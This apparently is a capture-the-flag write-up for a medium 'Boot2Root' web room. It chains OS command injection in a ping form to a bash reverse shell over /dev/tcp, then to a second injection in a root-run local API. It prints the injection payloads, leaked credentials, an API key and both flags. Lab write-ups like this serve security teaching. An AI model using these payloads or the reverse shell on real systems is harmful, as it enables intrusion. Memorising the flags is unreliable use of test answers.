**Tags:** Web, Boot2Root.
**Difficulty:** Medium.

## 1. Reconnaissance

The goal of the room is to obtain the **user and root flags**, meaning to fully compromise the system.

Target:

```text
10.112.179.167
```

We start with a standard scan:

```bash
sudo nmap -sV -sC -O 10.112.179.167
```

We get:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 07:12 EDT
Nmap scan report for 10.112.179.167
Host is up (0.089s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 bd:99:b4:3a:97:32:e7:93:d7:ee:7d:ff:d3:a9:e3:61 (ECDSA)
|_  256 f1:e0:08:54:da:16:18:88:9c:19:a1:8e:fa:c5:38:cf (ED25519)
80/tcp open  http    Gunicorn
| http-robots.txt: 2 disallowed entries
|_/internal/ /status
|_http-server-header: gunicorn
|_http-title: Byte Lotus — Stay Noticed
```

Open ports:

```text
22/tcp — SSH
80/tcp — HTTP (Gunicorn)
```

The `robots.txt` file is particularly interesting because it reveals two disallowed paths:

```text
/internal/
/status
```

---

# 2. robots.txt

We check:

```text
http://10.112.179.167/robots.txt
```

Contents:

```text
User-agent: *
Disallow: /internal/
Disallow: /status
```

We navigate to `/status`:

```text
http://10.112.179.167/status
```

The page contains a **Staff tools → Sister-property connectivity** form that allows us to specify a host to check the availability of a remote property.

This looks like a potential entry point, since the server must somehow process the supplied value.

---

# 3. Testing the ping Command

First, we test a normal value:

```text
127.0.0.1
```

The server returns:

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
```

Therefore, the backend actually executes the system `ping` command.

---

# 4. Discovering Command Injection

We check how the application handles special characters.

We enter:

```text
'
```

We get:

```text
/bin/sh: 1: Syntax error: Unterminated quoted string
```

This is an important sign: the supplied value is being passed directly into a shell command.

We test command substitution:

```text
host=$(id)
```

We get:

```text
ping: groups=1001(web): Name or service not know
```

This confirms that the `id` command was executed.

Thus, `/status` contains **OS Command Injection**.

---

# 5. Obtaining the User Flag

After confirming command injection, we try to read the user's file:

```text
host=$(cat /home/web/user.txt)
```

The server returns:

```text
ping: THM{n0_v1s1bl3_3dg3}: Name or service not known
```

Therefore, the first flag is:

```text
THM{n0_v1s1bl3_3dg3}
```

---

# 6. Obtaining a Reverse Shell

For full access to the system, we use command injection to launch a reverse shell:

```text
$(bash -c 'bash -i >& /dev/tcp/192.168.154.82/4444 0>&1')
```

After sending the payload, we get a shell on the machine:

```text
web@tryhackme-2404:/var/www/infinity_pool/edge$
```

We check the contents of the current directory:

```bash
ls -la
```

We get:

```text
total 32
drwxr-xr-x 5 root root 4096 Jun 30 09:33 .
drwxr-xr-x 5 root root 4096 Jun 30 09:35 ..
-rw-r--r-- 1 root root 1070 Jun 30 09:22 app.py
-rw-r--r-- 1 root root   30 Jun 29 10:14 requirements.txt
drwxr-xr-x 2 root root 4096 Jun 29 10:14 static
drwxr-xr-x 2 root root 4096 Jun 29 10:14 templates
drwxr-xr-x 5 root root 4096 Jun 30 09:06 venv
-rw-r--r-- 1 root root   34 Jun 29 10:14 wsgi.py
```

Current user:

```text
web
```

---

# 7. Finding a Path to Root

After obtaining a shell, we run LinPEAS to search for privilege escalation opportunities.

As a result, we discover a systemd service:

```text
/etc/systemd/system/cc-automation.service
```

We inspect its contents:

```bash
cat /etc/systemd/system/cc-automation.service
```

We get:

```text
[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn \
    --workers 1 \
    --bind 127.0.0.1:9000 \
    wsgi:app
```

The key point is:

```text
User=root
Group=root
```

The automation service runs as `root`.

At the same time, the service listens only on localhost:

```text
127.0.0.1:9000
```

---

# 8. Investigating the Automation API

We check the health endpoint:

```bash
curl -sS http://127.0.0.1:9000/health
```

We get:

```json
{
    "endpoints": {
        "GET /health": "service status",
        "POST /jobs/export": {
            "auth": "Authorization: Bearer <automation key>",
            "body": {
                "report": "<report name>"
            },
            "desc": "archive the latest data export"
        }
    },
    "runs_as": "root",
    "service": "automation",
    "status": "ok"
}
```

We discover an interesting endpoint:

```text
POST /jobs/export
```

It requires:

```text
Authorization: Bearer <automation key>
```

And the service itself runs as `root`.

---

# 9. Obtaining the Configuration

Next, we check another local API:

```bash
curl -sS http://127.0.0.1:3000/api/config
```

We get:

```json
{
    "automation_endpoint": "http://127.0.0.1:9000",
    "note": "internal network only -- do not expose",
    "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
    "telephony_pass": "St4yN0t1c3d_2026",
    "telephony_portal": "http://127.0.0.1:8080/ucp",
    "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Thus, the configuration reveals:

```text
Automation endpoint:
http://127.0.0.1:9000

Telephony portal:
http://127.0.0.1:8080/ucp

Username:
FreePBXUCPTemplateCreator

Password:
St4yN0t1c3d_2026
```

---

# 10. Telephony Credentials

From the configuration, we obtain:

```text
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

We also note:

```text
FreePBX CVE-2026-46376
```

An SSH tunnel was used to access the internal telephony portal:

```bash
ssh -o IdentitiesOnly=yes -i infinity -L 8080:127.0.0.1:8080 web@10.113.184.19
```

We also find the automation key:

```text
Automation Key: cc_auto_7b3f9a1c4e0d2f6a
```

---

# 11. Command Injection in `/jobs/export`

Now we have everything necessary to access the internal automation API:

```text
Endpoint:
http://127.0.0.1:9000/jobs/export

Authorization:
Bearer cc_auto_7b3f9a1c4e0d2f6a
```

First, we test the `report` parameter with the `id` command:

```bash
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"test;id;#"}'
```

We use:

```text
test;id;#
```

as the `report` value to test for command injection.

Since the automation service runs as `root`, successful execution of `id` should show the root context.

---

# 12. Obtaining the Root Flag

After confirming command injection, we use the same endpoint to read the root flag:

```bash
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"x;cat /root/root.txt;#"}'
```

The payload:

```text
x;cat /root/root.txt;#
```

allows us to execute:

```bash
cat /root/root.txt
```

in the context of the root service.

We get the root flag:

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

---

# Final Chain

```text
Nmap
  │
  ├── 22/tcp SSH
  │
  └── 80/tcp HTTP
          │
          ▼
      /robots.txt
          │
          ▼
       /status
          │
          ▼
   ping functionality
          │
          ▼
   Command Injection
          │
          ├── $(id)
          │
          ├── $(cat /home/web/user.txt)
          │
          │       ▼
          │   User flag
          │
          └── Reverse shell
                  │
                  ▼
             user: web
                  │
                  ▼
               LinPEAS
                  │
                  ▼
       cc-automation.service
                  │
                  ▼
          service runs as root
                  │
                  ▼
      http://127.0.0.1:9000
                  │
                  ▼
          /jobs/export
                  │
                  ▼
          Automation Key
                  │
                  ▼
       Command Injection
                  │
                  ▼
          cat /root/root.txt
                  │
                  ▼
               Root flag
```

## User flag

```text
THM{n0_v1s1bl3_3dg3}
```

## Root flag

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

## Vulnerabilities

The main exploitation chain consists of two command injections.

The first is located in `/status`: the supplied `host` value is passed into a shell command that runs `ping`, allowing arbitrary commands to be executed as the `web` user.

The second is located in the internal automation API `/jobs/export`. The service runs with:

```text
User=root
Group=root
```

and the `report` parameter allows command injection. As a result, executing:

```text
cat /root/root.txt
```

runs with root privileges.

Thus, the chain is:

```text
Command Injection → web shell → enumeration → root service → Command Injection → root flag
```
